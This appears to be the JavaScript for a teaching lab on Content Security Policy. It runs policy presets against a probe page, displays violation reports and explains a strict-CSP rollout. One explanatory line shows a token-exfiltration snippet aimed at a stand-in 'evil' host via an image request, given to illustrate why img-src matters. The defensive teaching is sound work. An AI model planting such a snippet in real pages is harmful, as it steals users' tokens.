// Lab 02 — Content Security Policy.
//
// The probe page (/api/csp-page) attempts seven things and reports which succeeded. Everything the
// policy blocks shows up twice: as a failed probe, and as a violation report.

import { $, on, Log, renderTable } from '/shared/lab-ui.js';

const log = new Log('#log');
const out = $('out');
const REPORT = 'report-uri /api/csp-report';

const PRESETS = {
  'p-none': '',
  'p-self': `default-src 'self'; ${REPORT}`,
  'p-unsafe': `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ${REPORT}`,
  // NONCE is substituted by the server with 'nonce-<random>' and put on ONE inline script.
  'p-nonce': `default-src 'self'; script-src NONCE; style-src 'self' 'unsafe-inline'; ${REPORT}`,
  'p-strict': `object-src 'none'; base-uri 'none'; script-src NONCE 'strict-dynamic' https: 'unsafe-inline'; ${REPORT}`,
  'p-lock': `default-src 'none'; style-src 'self'; ${REPORT}`,
};

for (const [id, value] of Object.entries(PRESETS)) {
  on(id, () => { $('policy').value = value; });
}

let timer = null;
function probe({ reportOnly = false } = {}) {
  const policy = $('policy').value.trim();
  const usesNonce = policy.includes('NONCE');
  const params = new URLSearchParams();
  if (policy) params.set(reportOnly ? 'ro' : 'policy', policy);
  if (usesNonce) params.set('nonce', '1');
  $('#violations').textContent = '';
  log.head(`${reportOnly ? 'report-only' : 'enforced'}: ${policy || '(no policy)'}`);
  $('#frame').src = `/api/csp-page?${params}&t=${Date.now()}`;

  clearTimeout(timer);
  timer = setTimeout(() => {
    renderTable('#results', [{ probe: '(no report)', ran: '—',
      note: "the probe page's own script was blocked, which is itself the answer" }],
      { columns: ['probe', 'ran', 'note'] });
    log.bad('no message from the frame — the policy blocked its reporting script');
    out.textContent =
      "The frame never reported back. That means the policy blocked the page's own inline script.\n" +
      'A policy that blocks your app is not a strict policy, it is an outage — which is exactly why\n' +
      'the rollout order is report-only first. Try the nonce preset.';
  }, 2000);
}

addEventListener('message', (e) => {
  if (!e.data || !e.data.probe) return;
  clearTimeout(timer);
  const rows = Object.entries(e.data.probe).map(([probe, ran]) => ({
    probe,
    ran: ran ? 'ran' : 'BLOCKED',
    _ranClass: ran ? 'meh' : 'ok',      // for a security policy, "blocked" is the good column
  }));
  renderTable('#results', rows, { columns: ['probe', 'ran'] });

  const v = e.data.violations ?? [];
  if (v.length) {
    renderTable('#violations', v.map((x) => ({
      directive: x.directive, blocked: x.blocked, disposition: x.disposition, sample: x.sample,
    })), { columns: ['directive', 'blocked', 'disposition', 'sample'] });
    for (const x of v) log.bad(`violation: ${x.directive} blocked ${x.blocked}`);
  } else {
    log.ok('no violations');
  }

  const ran = rows.filter((r) => r.ran === 'ran').map((r) => r.probe);
  out.textContent =
    `Survived: ${ran.join(', ') || 'nothing'}\n\n` +
    'Read this as an attacker would: every row that says "ran" is a capability an injection\n' +
    'inherits. "inline script (no nonce)" running means an injected <script> runs. "eval()" running\n' +
    'means a JSON-ish payload can become code. "fetch (cross-origin)" running means stolen data has\n' +
    'a way out — connect-src is the exfiltration control people forget.\n\n' +
    "Note that 'unsafe-inline' and a nonce cannot both apply: when a nonce or hash is present the\n" +
    "browser IGNORES 'unsafe-inline'. That is deliberate, and it is what makes the strict-dynamic\n" +
    'preset safe to ship to old browsers that ignore strict-dynamic.';
});

on('run', () => probe());
on('ro', () => {
  probe({ reportOnly: true });
  setTimeout(() => {
    out.textContent +=
      '\n\nIn report-only mode nothing was blocked — every probe ran — but the violations were still\n' +
      'reported (disposition: "report"). That is the deployment mode: you learn what a policy WOULD\n' +
      'break, from real traffic, before it breaks anything.';
  }, 1200);
});

on('reports', async () => {
  const { reports } = await fetch('/api/csp-report?list').then((r) => r.json());
  if (!reports.length) {
    log.muted('no reports collected — run a policy with report-uri first');
    return;
  }
  renderTable('#violations', reports.slice(-10).map(({ at, report, raw }) => {
    const b = report?.['csp-report'] ?? report ?? {};
    return {
      at: at.slice(11, 19),
      directive: b['violated-directive'] ?? b.effectiveDirective ?? '(see raw)',
      blocked: (b['blocked-uri'] ?? b.blockedURL ?? raw ?? '').slice(0, 60),
    };
  }), { columns: ['at', 'directive', 'blocked'] });
  out.textContent =
    `${reports.length} report(s) collected by the server.\n\n` +
    'This is the part that makes CSP operable. `report-uri` (legacy but universally supported) and\n' +
    '`report-to` (the Reporting API) POST a JSON body describing each violation. In production that\n' +
    'endpoint is your early-warning system — and your inventory of the inline scripts you forgot\n' +
    'about, including the ones injected by browser extensions and marketing tags.\n\n' +
    'Budget for noise: extensions, ISP injection and old browsers generate reports you cannot fix.\n' +
    'Filter by whether blocked-uri is a URL you recognise.';
});

on('rollout', () => {
  renderTable('#results', [
    { step: '1', do: 'Ship Report-Only with your target policy', why: 'zero risk; you learn from real traffic' },
    { step: '2', do: 'Read reports for 1–2 weeks', why: 'finds the inline handler in the 2019 template' },
    { step: '3', do: 'Fix the app, not the policy', why: 'move inline scripts to files, delete eval, add nonces' },
    { step: '4', do: 'Add nonces to the scripts you must keep inline', why: 'per-response random, never reused' },
    { step: '5', do: 'Enforce; keep Report-Only for the NEXT tightening', why: 'the two headers can run side by side' },
  ], { columns: ['step', 'do', 'why'] });

  out.textContent =
    'THE POLICY TO AIM FOR (Google\'s "strict CSP", and the only one that holds up):\n\n' +
    "  script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';\n" +
    "  object-src 'none';\n" +
    "  base-uri 'none';\n\n" +
    'Why each piece:\n' +
    "  'nonce-{random}'  a fresh random value per RESPONSE. Never per deploy, never reused, never\n" +
    '                    derived from anything guessable — a predictable nonce is no nonce.\n' +
    "  'strict-dynamic'  a script that already passed the check may load more scripts. This is what\n" +
    '                    makes CSP survive bundlers, dynamic import and third-party loaders — you\n' +
    '                    stop maintaining a host allow-list, which never worked anyway (any CDN with\n' +
    '                    an old AngularJS on it defeats a host allow-list).\n' +
    "  https: 'unsafe-inline'  fallbacks for browsers that do not understand the modern keywords.\n" +
    '                    Modern browsers ignore both once a nonce is present.\n' +
    "  object-src 'none' <object>/<embed> are legacy script-execution vectors.\n" +
    "  base-uri 'none'   stops <base href> from redirecting every relative script URL. This one is\n" +
    '                    the non-obvious hole in nonce-only policies.\n\n' +
    'And the directives that are about something other than script execution:\n' +
    '  frame-ancestors   clickjacking. Replaces X-Frame-Options; NOT covered by default-src.\n' +
    '  connect-src       exfiltration after an XSS.\n' +
    '  form-action       where an injected form can post your data.\n' +
    '  img-src           the sneakiest exfil channel: new Image().src = "https://evil/?" + token\n\n' +
    'Two traps: a policy in a <meta> tag cannot use frame-ancestors, report-uri or sandbox; and\n' +
    'default-src is not a catch-all — frame-ancestors, form-action and base-uri do not fall back to it.';
});

on('clear', () => { log.clear(); $('#results').textContent = ''; $('#violations').textContent = '';
  $('#frame').src = 'about:blank'; });
